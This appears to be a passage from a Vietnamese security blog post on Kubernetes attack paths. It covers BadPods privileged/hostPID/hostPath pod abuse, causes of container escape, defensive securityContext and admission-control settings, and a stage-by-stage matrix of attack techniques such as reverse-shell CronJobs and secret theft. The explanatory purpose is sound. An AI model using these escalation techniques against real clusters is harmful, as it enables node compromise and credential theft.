Điều này cho phép container nhìn thấy process đang chạy trên Node. Nếu kết hợp với privileged: true, attacker có thể dùng kỹ thuật như nsenter để vào namespace của process trên host, thường là PID 1.

Nói dễ hiểu:

`hostPID: true -> thấy process của Node privileged: true -> có quyền tương tác sâu hostPath: / -> thấy filesystem của Node`

Khi 3 thứ này kết hợp lại, ranh giới container và host gần như bị phá vỡ.

## Flow tấn công

```
Attacker có quyền create pods
        |
        v
Tạo Pod ubuntu với privileged + hostPID + hostNetwork + hostPath /
        |
        v
Exec vào container
        |
        v
Truy cập /host để đọc filesystem của Node
        |
        v
Tìm kubelet config, kubeconfig, token, secret, certificate
        |
        v
Có thể leo thang ra Node hoặc cluster
```

## Vì sao nó nguy hiểm?

Vì Pod này có quá nhiều đặc quyền cùng lúc:

|Cấu hình|Nguy hiểm ở đâu|
|---|---|
|privileged: true|Container có quyền rất cao trên host|
|runAsUser: 0|Chạy bằng root trong container|
|allowPrivilegeEscalation: true|Cho phép leo quyền trong container|
|hostPath: /|Mount toàn bộ filesystem của Node|
|hostPID: true|Nhìn thấy process của Node|
|hostNetwork: true|Dùng network của Node|
|hostIPC: true|Dùng IPC của Node|

Nếu cluster không có Pod Security Admission, Kyverno, Gatekeeper hoặc policy tương đương để chặn các cấu hình này, quyền create pods có thể trở thành đường dẫn leo thang rất mạnh.


### Stealth / BadPods

### Các biến thể Pod nguy hiểm

Không phải lúc nào attacker cũng cần tạo một Pod bật tất cả quyền nguy hiểm. Trong thực tế, mỗi cấu hình có thể tạo ra một mức độ rủi ro khác nhau.

Một số biến thể thường được nghiên cứu trong BadPods:

- **Privileged + hostPID**: rất nguy hiểm vì container có quyền cao và nhìn thấy process của host.
- **Privileged only**: có thể tương tác sâu với hệ thống, phụ thuộc runtime và kernel.
- **hostPath**: nguy hiểm nếu mount thư mục nhạy cảm của Node.
- **hostPID**: có thể quan sát process trên host, tìm thông tin nhạy cảm trong command line.
- **hostNetwork**: có thể truy cập network từ góc nhìn của Node.
- **hostIPC**: có thể ảnh hưởng hoặc đọc IPC/shared memory trong một số trường hợp.

Ý nghĩa của phần này là: Kubernetes privilege escalation không chỉ đến từ một cấu hình duy nhất, mà thường là kết quả của nhiều cấu hình yếu kết hợp với nhau.

Bạn có thể tham khảo ví dụ cách tạo cấu hình badpods tại link này khá là hay ở đây.

https://github.com/BishopFox/badPods

Ngoài ra tui cũng có nghiên cứu 1 case khá là hay trên X của Duffie Cooley minh họa một one-liner tạo Pod đặc quyền để truy cập namespace của Node. Tận dụng 2 cấu hình là  bật `hostPID: true` và `privileged: true` https://x.com/mauilion/status/1129468485480751104



### Container escape

Một trong những rủi ro nghiêm trọng nhất khi vận hành kubernetes là container breakout , là  tình hướng mà một tiến trình chạy trong container có quyền thoát ra cơ chế cô lập hiện tại của container và tác động lên host và node cũng như các tài nguyên khác trong cluster.

Về  lý thuyết ,container breakout thường được hiểu là khai thác lỗ hổng phía kernel ,container runtime ,network stack hoặc storage stack để phá vỡ cơ chế isolation . Tuy nhiên trong thực tế , không phải lúc nào attacker cũng phải tấn công bằng các lỗi Zero day phức tạp ,nhưng bạn có thể tham khảo các CVE 2026 về linux kernel như : Copy-fail , DirtyFrag, DirtyDecrypt,... .Nhiều trường hợp breakout vẫn xảy ra do misconfig , ví dụ container chạy với quyền quá cao ,mount file system của host ,cấp thừa linux capabilities, hoặc ServiceAccount có RBAC quá rộng

Nói cách khác, nếu một container được cấu hình sai, attacker có thể không cần “hack kernel” mà vẫn có đường hợp lệ để chạm tới host hoặc cluster.

Một số nguyên nhân phổ biến dẫn tới container escape gồm:

- Container chạy bằng user root.
- Container được cấp privileged: true.
- Container có capability nguy hiểm như CAP_SYS_ADMIN.
- Pod mount host filesystem bằng hostPath.
- Container có thể truy cập socket nhạy cảm như Docker/container runtime socket.
- Service account token trong pod có quyền quá rộng.
- Workload có thể gọi cloud metadata API để lấy credential.
- Kernel hoặc container runtime có CVE chưa được vá.
- App bên trong container bị RCE, sau đó attacker dùng quyền hiện có để pivot.

Điểm quan trọng là container không phải là một “máy ảo nhỏ” với boundary cứng như nhiều người tưởng. Container dùng chung kernel với host, nên nếu attacker có đủ quyền bên trong container, đặc biệt là root cộng thêm capability nguy hiểm, ranh giới bảo mật sẽ trở nên rất mỏng.

Ví dụ, nếu một container chạy ở chế độ privileged và có quyền mount thiết bị của host, attacker có thể tương tác với filesystem bên ngoài container. Khi đó container không còn chỉ nhìn thấy filesystem riêng của nó nữa, mà có thể nhìn thấy hoặc ghi vào filesystem của node. Đây là một dạng breakout rất nguy hiểm vì attacker có thể đặt persistence, đọc dữ liệu nhạy cảm, hoặc can thiệp vào cấu hình host.

Tuy nhiên, không phải container nào cũng dễ breakout. Nếu workload chạy bằng non-root user, bị drop capabilities, filesystem chỉ đọc, không có hostPath nguy hiểm, và được giới hạn bởi AppArmor/SELinux/seccomp, thì rất nhiều kỹ thuật escape sẽ bị vô hiệu hóa hoặc khó thực hiện hơn nhiều.

Vì vậy, trong phòng thủ Kubernetes, cần chú ý các cấu hình sau:

```
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

Ngoài ra, ở cấp cluster nên dùng admission control để chặn các workload nguy hiểm, ví dụ:

- Không cho phép privileged: true.
- Không cho phép container chạy bằng root nếu không có lý do rõ ràng.
- Không cho phép mount hostPath tùy tiện.
- Không cho phép thêm capability nguy hiểm.
- Bắt buộc dùng seccomp profile.
- Bắt buộc AppArmor hoặc SELinux policy nếu môi trường hỗ trợ.
- Giới hạn quyền của service account theo nguyên tắc least privilege.

Một điểm cần nhớ là trong Kubernetes, **pod thường là trust boundary**, không phải từng container riêng lẻ. Các container trong cùng một pod có thể chia sẻ network namespace, volume, và một số tài nguyên khác. Vì vậy nếu một container trong pod bị compromise, các container còn lại trong cùng pod cũng nên được xem là có nguy cơ bị ảnh hưởng.

Container breakout cũng có thể đi theo hướng không trực tiếp phá kernel, mà pivot sang các thành phần khác:

- Đọc service account token rồi gọi Kubernetes API.
- Dò các service nội bộ trong cluster.
- Truy cập cloud metadata service để lấy temporary credential.
- Tìm secret trong environment variable hoặc config file.
- Tấn công kubelet API nếu node expose sai.
- Lạm dụng workload identity để truy cập cloud resources.

Điều này cho thấy breakout không chỉ là “thoát khỏi container ra host”, mà còn là bất kỳ cách nào phá vỡ giả định isolation ban đầu của operator. Nếu workload chỉ đáng lẽ được phép chạy app, nhưng attacker dùng nó để đọc Secret, điều khiển API server, hoặc truy cập cloud account, thì về mặt rủi ro nó vẫn là một dạng isolation failure nghiêm trọng.

Tóm lại, container escape thường đến từ ba nhóm nguyên nhân chính:

1. **Lỗ hổng kỹ thuật**  
    Kernel bug, container runtime CVE, filesystem bug, network stack bug.
    
2. **Cấu hình sai**  
    Privileged container, root user, hostPath mount, capability dư thừa, thiếu seccomp/AppArmor/SELinux.
    
3. **Pivot qua credential hoặc control plane**  
    Service account token, kubeconfig, cloud metadata, workload identity, Kubernetes API, kubelet API.


### Phòng thủ cho badpods

Trong Kubernetes, RBAC chỉ kiểm tra một identity có được phép tạo Pod hay không. Tuy nhiên, RBAC không đủ để đánh giá Pod đó có an toàn hay không. Vì vậy Kubernetes cần thêm lớp Admission Controller để kiểm tra nội dung Pod trước khi cho phép tạo.

Các cơ chế như Pod Security Admission, Kyverno hoặc OPA Gatekeeper có thể chặn những cấu hình nguy hiểm như `privileged: true`, `hostPID`, `hostNetwork` hoặc `hostPath`. Đây là lớp phòng thủ quan trọng để ngăn attacker biến quyền `create pods` thành khả năng truy cập Node.

Tóm lại, để giảm rủi ro Pod escape, cần kết hợp hai lớp kiểm soát: RBAC giới hạn ai được tạo Pod, và Admission Policy giới hạn Pod được phép chứa cấu hình gì.



Đây là sơ đồ tấn công mà mình kiếm được trên mạng khi bạn có thể tiếp cận cluster từ các hướng khác nhau 

![](/assets/images/posts/Pasted%20image%2020260524172250.png)

Nó cho thấy attacker có thể tiếp cận cluster từ nhiều hướng khác nhau:

- **Access API server**: attacker hoặc user có credential có thể gọi trực tiếp Kubernetes API server.
- **Misconfigured Kubernetes dashboard**: dashboard cấu hình sai có thể cho phép truy cập cluster qua UI.
- **Malicious container image in registry**: image độc hại được push lên container registry, sau đó được deploy vào cluster.
- **Vulnerable application**: app chạy trong pod có lỗ hổng, attacker khai thác app rồi pivot vào pod/cluster.
- **Misconfigured Docker daemon**: Docker daemon expose sai cấu hình, attacker có thể điều khiển container/node.
- **Developer/DevOps**: tài khoản hoặc máy của developer/devops bị compromise, từ đó ảnh hưởng registry hoặc cluster.

Bên trong hình có 2 vùng chính:

**Master / control plane**  
Bên trái là thành phần điều khiển Kubernetes:

- API server: cổng trung tâm để mọi thứ giao tiếp với cluster.
- etcd: nơi lưu state/secret/config của cluster.
- Scheduler: quyết định pod chạy ở node nào.
- controller manager: điều phối trạng thái cluster.
- K8s dashboard: giao diện web quản trị cluster nếu có cài.

**Node / worker node**  
Bên phải là máy chạy workload:

- kubelet: agent trên node, nhận lệnh từ API server để chạy pod.
- kube-proxy: xử lý networking/service routing.
- Pod: nơi container/app chạy.
- API: có thể là app API bên trong pod.

Các nhãn như **Peirates**, **kube-hunter**, **BOB**, **Deepce** là công cụ bảo mật/offensive Kubernetes/container thường dùng để kiểm tra hoặc khai thác cấu hình yếu:

- kube-hunter: scanner tìm lỗ hổng/cấu hình yếu trong Kubernetes.
- Peirates: công cụ hỗ trợ privilege escalation và discovery trong Kubernetes.
- BOB, Deepce: công cụ liên quan đến container/Kubernetes enumeration hoặc escape-checking.

**Kubernetes có nhiều điểm vào**, không chỉ mỗi API server. Attacker có thể đi từ app lỗi, dashboard cấu hình sai, image độc, Docker daemon expose, registry, developer account, hoặc credential bị lộ. Khi đã vào được một pod hoặc node, họ có thể tiếp tục enumerate, pivot, leo thang quyền, hoặc tác động đến control plane nếu cấu hình cluster yếu.

![](/assets/images/posts/Pasted%20image%2020260524175900.png)

Hoặc là kĩ thuật reverse shell trong 1 container bị compromise


![](/assets/images/posts/Pasted%20image%2020260524180647.png)


### Attack surface cho K8s

![](/assets/images/posts/Pasted%20image%2020260524211855.png)



|Initial access (popping a shell pt 1 - prep)|Execution (popping a shell pt 2 - exec)|Persistence (keeping the shell)|Privilege escalation (container breakout)|Defense evasion (assuming no IDS)|Credential access (juicy creds)|Discovery (enumerate possible pivots)|Lateral movement (pivot)|Command & control (C2 methods)|Impact (dangers)|
|---|---|---|---|---|---|---|---|---|---|
|Using cloud credentials: service account keys, impersonation|Exec into container (bypass admission control policy)|Backdoor container (add a reverse shell to local or container registry image)|Privileged container (legitimate escalation to host)|Clear container logs (covering tracks after host breakout)|List K8s Secrets|List K8s API server (nmap, curl)|Access cloud resources (workload identity and cloud integrations)|Dynamic resolution (DNS tunneling)|Data destruction (datastores, files, NAS, ransomware…)|
|Compromised images in registry (supply chain unpatched or malicious)|BASH/CMD inside container (implant or trojan, RCE/reverse shell, malware, C2, DNS tunneling)|Writable host path mount (host mount breakout)|Cluster admin role binding (untested RBAC)|Delete K8s events (covering tracks after host breakout)|Mount service principal (Azure specific)|Access `kubelet` API|Container service account (API server)|App protocols (L7 protocols, TLS, …)|Resource hijacking (cryptojacking, malware C2/distribution, open relays, botnet membership)|
|Application vulnerability (supply chain unpatched or malicious)|Start new container (with malicious payload: persistence, enumeration, observation, escalation)|K8s CronJob (reverse shell on a timer)|Access cloud resources (metadata attack via workload identity)|Connect from proxy server (to cover source IP, external to cluster)|Applications credentials in config files (key material)|Access K8s dashboard (UI requires service account credentials)|Cluster internal networking (attack neighboring pods or systems)|Botnet (k3d, or traditional)|Application DoS|
|kubeconfig file (exfiltrated, or uploaded to the wrong place)|Application exploit (RCE)|Static pods (reverse shell, shadow API server to read audit-log-only headers)|Pod `hostPath` mount (logs to container breakout)|Pod/container name similarity (visual evasion, CronJob attack)|Access container service account (RBAC lateral jumps)|Network mapping (nmap, curl)|Access container service account (RBAC lateral jumps)||Node scheduling DoS|
|Compromise user endpoint (2FA and federating auth mitigate)|SSH server inside container (bad practice)|Injected sidecar containers (malicious mutating webhook)|Node to cluster escalation (stolen credentials, node label rebinding attack)|Dynamic resolution (DNS) (DNS tunneling/exfiltration)|Compromise admission controllers|Instance metadata API (workload identity)|Host writable volume mounts||Service discovery DoS|
|K8s API server vulnerability (needs CVE and unpatched API server)|Container lifecycle hooks (`postStart` and `preStop` events in pod YAML)|Rewrite container lifecycle hooks (`postStart` and `preStop` events in pod YAML)|Control plane to cloud escalation (keys in Secrets, cloud or control plane credentials)|Shadow admission control or API server||Compromise K8s Operator (sensitive RBAC)|Access K8s dashboard||PII or IP exfiltration (cluster or cloud datastores, local accounts)|
|Compromised host (credentials leak/stuffing, unpatched services, supply chain compromise)||Rewrite liveness probes (exec into and reverse shell in container)|Compromise admission controller (reconfigure and bypass to allow blocked image with flag)|||Access host filesystem (host mounts)|Access tiller endpoint (Helm v3 negates this)||Container pull rate limit DoS (container registry)|
|Compromised `etcd` (missing auth)||Shadow admission control or API server (privileged RBAC, reverse shell)|Compromise K8s Operator (compromise flux and read any Secrets)||||Access K8s Operator||SOC/SIEM DoS (event/audit/log rate limit)|
|||K3d botnet (secondary cluster running on compromised nodes)|Container breakout (kernel or runtime vulnerability e.g., DirtyCOW, `/proc/self/exe`, eBPF verifier bugs, Netfilter)||

Đoạn này là một bảng attack chain cho môi trường **container / Kubernetes / cloud**. Mỗi cột là một giai đoạn trong vòng đời tấn công, còn mỗi dòng là ví dụ kỹ thuật mà attacker có thể dùng ở giai đoạn đó.

Nói ngắn gọn: nó mô tả attacker đi từ **có quyền ban đầu**, chạy lệnh trong container, giữ quyền truy cập, leo thang ra host hoặc cluster, né phát hiện, lấy credential, dò hệ thống, pivot sang nơi khác, thiết lập C2, rồi gây tác động.

**Các cột nghĩa là gì**

Initial access  
Cách attacker vào được hệ thống ban đầu. Ví dụ: lộ cloud credential, kubeconfig bị leak, app có RCE, image trong registry bị cài mã độc, endpoint người dùng bị compromise.

Execution  
Sau khi vào được, attacker chạy code/lệnh. Ví dụ: exec vào container, chạy bash/cmd, tạo container mới chứa payload, khai thác app để RCE.

Persistence  
Giữ quyền truy cập lâu dài. Ví dụ: backdoor image, CronJob chạy reverse shell theo lịch, static pod, SSH server trong container, lifecycle hook độc hại.

Privilege escalation  
Leo thang quyền. Trong Kubernetes thường là từ pod/container lên node, từ node lên cluster, hoặc từ cluster lên cloud. Ví dụ: privileged container, writable hostPath mount, kubelet API, RBAC quá rộng, container breakout qua kernel/runtime bug.

Defense evasion  
Né phát hiện. Ví dụ: xóa container logs, xóa Kubernetes events, dùng tên pod/container giống workload hợp pháp, shadow API server/admission controller, bypass admission policy.

Credential access  
Tìm và lấy credential. Ví dụ: list K8s Secrets, đọc service account token, cloud service principal, workload identity token, kubeconfig, credential trong config file, etcd không bảo vệ.

Discovery  
Dò hệ thống để tìm pivot. Ví dụ: list Kubernetes API server, nmap/curl mạng nội bộ cluster, truy cập dashboard, kubelet API, operator, service discovery, cloud metadata.

Lateral movement  
Di chuyển ngang sang pod/node/service/cloud khác. Ví dụ: dùng service account để gọi API server, workload identity để vào cloud resources, attack neighboring pods, truy cập dashboard/operator/tiller.

Command & control  
Kênh điều khiển từ xa. Ví dụ: DNS tunneling, proxy server để che IP nguồn, app protocol như HTTPS/TLS, botnet, malware C2.

Impact  
Hậu quả cuối cùng. Ví dụ: xóa dữ liệu, ransomware, cryptojacking, DoS app/node/service discovery/SIEM, exfiltration PII/IP, botnet, phá container registry.

**Một vài ví dụ dễ hiểu**

Using cloud credentials: service account keys, impersonation  
Nếu attacker có key cloud hoặc quyền impersonate service account, họ có thể vào cloud project/subscription trước, rồi từ đó tìm cluster hoặc workload liên quan.

Exec into container  
Attacker có quyền hoặc lỗ hổng cho phép mở shell bên trong container. Đây là bước “đã vào được workload”.

Privileged container  
Container chạy với quyền quá cao, có thể truy cập thiết bị/kernel capability của host. Đây là rủi ro lớn vì có thể dẫn tới host compromise.

Writable host path mount / Host writable volume mounts  
Pod mount thư mục từ host và có quyền ghi. Nếu mount nhạy cảm, attacker có thể sửa file trên node hoặc đặt persistence.

List K8s Secrets  
Nếu RBAC cho phép đọc Secret, attacker có thể lấy token, database password, cloud key, TLS key.

Instance metadata API  
Pod gọi metadata service của cloud để lấy token tạm thời. Nếu workload identity/metadata protection cấu hình sai, attacker có thể dùng token đó truy cập cloud resources.

K8s CronJob reverse shell on a timer  
Một cách persistence: tạo CronJob định kỳ gọi về attacker. Về phòng thủ, nên audit CronJob lạ và RBAC tạo workload.

Shadow admission control or API server  
Attacker dựng thành phần giả hoặc độc hại để đánh lừa/ghi nhận thông tin nhạy cảm hoặc bypass chính sách.

SOC/SIEM DoS  
Tạo quá nhiều log/event/audit để làm nghẽn hệ thống giám sát, khiến cảnh báo thật khó thấy hơn.

**Ý chính của toàn bộ bảng**

Đây không phải là một checklist “làm theo để hack”, mà là bản đồ rủi ro để defender/red team hiểu:

- Đường vào có thể đến từ app, image, kubeconfig, cloud key, người dùng, registry.
- Container không phải biên giới bảo mật tuyệt đối.
- RBAC, Secrets, service account và workload identity là vùng cực kỳ nhạy cảm.
- hostPath, privileged pod, kubelet API, metadata API là các điểm breakout/pivot phổ biến.
- Persistence trong Kubernetes thường ẩn trong CronJob, static pod, lifecycle hook, webhook, operator.
- Impact không chỉ là mất dữ liệu, mà còn cryptojacking, botnet, DoS, supply chain compromise.

Hiện tại tui mới nghiên cứu tới đây thôi vì mảng này cũng khá là rộng , sắp tới tui sẽ dựng lab và sẽ mô phỏng các kĩ thuật tấn công thực tế hơn. Cảm ơn các bạn đã dành thời gian đọc bài viết mình.!!!